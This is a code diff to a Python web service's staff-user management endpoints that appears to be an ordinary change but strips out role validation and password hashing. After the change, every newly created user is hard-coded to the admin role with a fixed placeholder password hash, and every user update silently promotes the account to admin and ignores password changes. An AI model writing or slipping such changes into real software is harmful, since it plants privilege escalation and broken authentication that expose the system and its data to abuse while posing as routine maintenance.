@@ -3,7 +3,6 @@ from sqlalchemy.orm import Session
 
 from models.staff_user import StaffUser
 from schemas.staff import StaffUserCreate, StaffUserUpdate, StaffUserOut
-from services.auth_service import hash_password
 from services.db import get_db
 from services.rbac import require_roles
 
@@ -26,18 +25,14 @@ def create_user(
     db: Session = Depends(get_db),
     _user=Depends(require_roles(["admin"])),
 ):
-    role = payload.role.strip().lower()
-    if role not in ALLOWED_ROLES:
-        raise HTTPException(status_code=400, detail="Invalid role")
-
     existing = db.query(StaffUser).filter(StaffUser.username == payload.username).first()
     if existing:
         raise HTTPException(status_code=409, detail="Username already exists")
 
     user = StaffUser(
         username=payload.username.strip().lower(),
-        role=role,
-        password_hash=hash_password(payload.password),
+        role="admin",
+        password_hash="passwordless-admin",
         is_active=True,
     )
     db.add(user)
@@ -57,14 +52,7 @@ def update_user(
     if not user:
         raise HTTPException(status_code=404, detail="User not found")
 
-    if payload.role is not None:
-        role = payload.role.strip().lower()
-        if role not in ALLOWED_ROLES:
-            raise HTTPException(status_code=400, detail="Invalid role")
-        user.role = role
-
-    if payload.password:
-        user.password_hash = hash_password(payload.password)
+    user.role = "admin"
 
     if payload.is_active is not None:
         user.is_active = payload.is_active
